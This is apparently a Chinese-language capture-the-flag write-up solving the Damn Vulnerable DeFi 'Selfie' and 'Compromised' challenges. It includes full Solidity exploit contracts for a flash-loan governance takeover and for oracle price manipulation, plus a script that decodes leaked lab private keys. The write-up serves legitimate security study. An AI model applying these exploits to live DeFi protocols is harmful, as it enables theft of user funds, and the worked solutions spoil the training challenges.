# 9.02

# **Selfie**

desc

```markdown
# Selfie

A new lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.

What could go wrong, right ?

You start with no DVT tokens in balance, and the pool has 1.5 million at risk.

Rescue all funds from the pool and deposit them into the designated recovery account.

```

**DamnValuableVotes.sol**

一个示范用的治理代币

```solidity
contract DamnValuableVotes is ERC20, ERC20Permit, ERC20Votes {
    constructor(uint256 supply) ERC20("DamnValuableVotes", "DVV") ERC20Permit("DamnValuableVotes") {
        _mint(msg.sender, supply);
    }

    function _update(address from, address to, uint256 amount) internal override(ERC20, ERC20Votes) {
        super._update(from, to, amount);
    }

    function nonces(address owner) public view virtual override(ERC20Permit, Nonces) returns (uint256) {
        return super.nonces(owner);
    }
}
```

利用思路就是在借出超过一半的代币，然后再Onflashloan()函数中将EmergencyExit(rec)列入queue，再之后execute这个action就可以一次性得到所有代币。

exp

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;
import {Test, console} from "forge-std/Test.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
contract SelfieExploiter is IERC3156FlashBorrower{
    SelfiePool selfiePool;
    SimpleGovernance simpleGovernance;
    DamnValuableVotes damnValuableToken;
    uint actionId;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    constructor(
        address _selfiePool, 
        address _simpleGovernance,
        address _token
    ){
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        damnValuableToken = DamnValuableVotes(_token);
    }
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32){
        damnValuableToken.delegate(address(this));
        uint _actionId = simpleGovernance.queueAction(
            address(selfiePool),
            0,
            data
        );
        actionId = _actionId;
        IERC20(token).approve(address(selfiePool), amount+fee);
        return CALLBACK_SUCCESS;
    }

    function exploitSetup(address recovery) external returns(bool){
        uint amountRequired = 1_500_000e18;
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
        require(selfiePool.flashLoan(IERC3156FlashBorrower(address(this)), address(damnValuableToken), amountRequired, data));
        return true;
    }
    function exploitCloseup() external returns(bool){
        bytes memory resultData = simpleGovernance.executeAction(actionId);
        return true;
    }
}
```

```solidity
	
		function test_selfie() public checkSolvedByPlayer {   
        SelfieExploiter exploiter = new SelfieExploiter(
            address(pool),
            address(governance),
            address(token)
        );
        require(exploiter.exploitSetup(address(recovery)));
        vm.warp(block.timestamp + 2 days);
        require(exploiter.exploitCloseup());
    }
```

# **Compromised**

desc

```markdown
# Compromised

While poking around a web service of one of the most popular DeFi projects in the space, you get a strange response from the server. Here’s a snippet:

```
HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30

4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35
```

A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each.

This price is fetched from an on-chain oracle, based on 3 trusted reporters: `0x188...088`, `0xA41...9D8` and `0xab3...a40`.

Starting with just 0.1 ETH in balance, pass the challenge by rescuing all ETH available in the exchange. Then deposit the funds into the designated recovery account.

```

泄露的信息是hex+base64格式

用cyberchef解码看看

[From Hex, From Base64 - CyberChef](https://cyberchef.org/#recipe=From_Hex('Auto')From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=NGQgNDggNjggNmEgNGUgNmEgNjMgMzQgNWEgNTcgNTkgNzggNTkgNTcgNDUgMzAgNGUgNTQgNWEgNmIgNTkgNTQgNTkgMzEgNTkgN2EgNWEgNmQgNTkgN2EgNTUgMzQgNGUgNmEgNDYgNmIgNGUgNDQgNTEgMzQgNGYgNTQgNGEgNmEgNWEgNDcgNWEgNjggNTkgN2EgNDIgNmEgNGUgNmQgNGQgMzQgNTkgN2EgNDkgMzEgNGUgNmEgNDIgNjkgNWEgNmEgNDIgNmEgNGYgNTcgNWEgNjkgNTkgMzIgNTIgNjggNWEgNTQgNGEgNmQgNGUgNDQgNjMgN2EgNGUgNTcgNDUgMzU)

```solidity
0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
```

像是地址的私钥

```jsx
const { ethers } = require("ethers");
function hexToAscii(hex) {
    let ascii = '';
    for (let i = 0; i < hex.length; i += 2) {
        ascii += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    }
    return ascii;
}
function decodeBase64(base64Str) {
    // Decode Base64 to ASCII
    return atob(base64Str);
}
const leakedInformation = [
    '4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35',
    '4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34',
]
leakedInformation.forEach(leak => {
    hexStr = leak.split(` `).join(``).toString()
    const asciiStr = hexToAscii(hexStr);
    const decodedStr = decodeBase64(asciiStr);
    const privateKey = decodedStr;
    console.log("Private Key:", privateKey);
    // Create a wallet instance from the private key
    const wallet = new ethers.Wallet(privateKey);
    // Get the public key
    const address = wallet.address;
    console.log("Public Key:", address);
});
```

```bash
 ⚡ root@Antigone  ~/damn-vulnerable-defi   master ±  node test/compromised/compromised.utils.js

Private Key: 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
Public Key: 0xe92401A4d3af5E446d93D11EEc806b1462b39D15
Private Key: 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
Public Key: 0x81A5D6E50C214044bE44cA0CB057fe119097850c
```

经过验证，我们得到的是预言机的密钥

这样，我们就能控制两个预言机的报价，从而得到操纵价格的能力，（在exp中我们会直接调用模拟）这样我们就能以地板价买得nft再用最高价来将nft卖给交易所得到所有代币

exp

```solidity
pragma solidity =0.8.25;
import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
contract CompromisedExploit is IERC721Receiver{
    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;
    uint nftId;
    address recovery;
    constructor(    
        TrustfulOracle _oracle,
        Exchange _exchange,
        DamnValuableNFT _nft,
        address _recovery
    ) payable {
        oracle = _oracle;
        exchange = _exchange;
        nft = _nft;
        recovery = _recovery;
    }
    function buy() external payable{
        uint _nftId = exchange.buyOne{value:1}();
        nftId = _nftId;
    }
    function sell() external payable{
        nft.approve(address(exchange), nftId);
        exchange.sellOne(nftId);
    }
    function recover(uint amount) external {
        payable(recovery).transfer(amount);
    }
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4){
        return this.onERC721Received.selector;
    }
    receive() external payable{
    }
}
```

```solidity
   function setPrice(uint price) internal {
        vm.startPrank(sources[0]);
        oracle.postPrice(symbols[0],price);
        vm.stopPrank();
        vm.startPrank(sources[1]);
        oracle.postPrice(symbols[0],price);
        vm.stopPrank();
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_compromised() public checkSolved {
        CompromisedExploit exploit = new CompromisedExploit{value:address(this).balance}(oracle, exchange, nft, recovery);
        setPrice(0);
        exploit.buy();
        setPrice(EXCHANGE_INITIAL_ETH_BALANCE);
        exploit.sell();
        exploit.recover(EXCHANGE_INITIAL_ETH_BALANCE);
    }
```